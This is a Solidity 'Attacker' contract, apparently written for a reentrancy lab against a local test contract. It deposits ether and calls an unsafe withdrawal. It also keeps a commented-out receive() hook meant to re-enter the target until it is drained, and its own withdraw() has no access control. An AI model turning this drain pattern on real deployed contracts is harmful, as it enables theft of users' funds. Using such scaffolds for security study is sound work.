// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./ReentrancyTest.sol";

contract Attacker {
    ReentrancyTest public reentrancyTest;
    uint256 public attackCount;

    constructor(address payable _bankAddress) {
        reentrancyTest = ReentrancyTest(_bankAddress);
    }

    // step 1: deposit then trigger withdrawal
    function attack() public payable {
        require(msg.value >= 1 ether, "Need 1 ETH");
        reentrancyTest.deposit{value: 1 ether}();
        reentrancyTest.unsafewithdraw();
    }

    function call_withdraw(uint256 amount) public {
        reentrancyTest.withdraw(amount);
    }

    function call_callinst () public {
        reentrancyTest.callinst();
    }

    // // Re-enter the vulnerable contract until all available Ether is drained
    /*receive() external payable {
    uint256 contractBalance = address(reentrancyTest).balance;
    uint256 myRecordedBalance = reentrancyTest.balances(address(this));
    if (contractBalance > 0 && myRecordedBalance > 0 && attackCount<=1) {
        reentrancyTest.unsafewithdraw();
    }
}*/

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function setAttackCount(uint256 _attackCount) public {
        attackCount = _attackCount;
    }

     function withdrawFull() public {
    uint256 balance = address(this).balance;

    require(balance > 0, "Contract has no balance");

    (bool success, ) = payable(msg.sender).call{value: balance}("");

    require(success, "Transfer failed");
}

     receive() external payable {

     }

     function withdraw() external {
        payable(msg.sender).call{value: address(this).balance}("");
    }
}